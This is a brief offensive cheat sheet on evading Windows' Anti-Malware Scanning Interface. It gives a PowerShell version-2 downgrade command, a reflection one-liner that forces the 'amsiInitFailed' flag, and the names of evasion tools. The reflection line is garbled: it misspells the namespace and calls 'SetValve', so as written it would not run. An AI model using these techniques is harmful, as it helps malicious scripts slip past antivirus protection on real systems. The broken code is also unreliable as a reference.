# Anti-Malware Scanning Interface (AMSI) Evasion

## Powershell Downgrade

#### powershell -Version 2

## Powershell Reflection

#### [Ref].Assembly.GetType('Syste.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValve($null,$true)

## Automation

### Tools: amsi.fail, AmsiTrigger
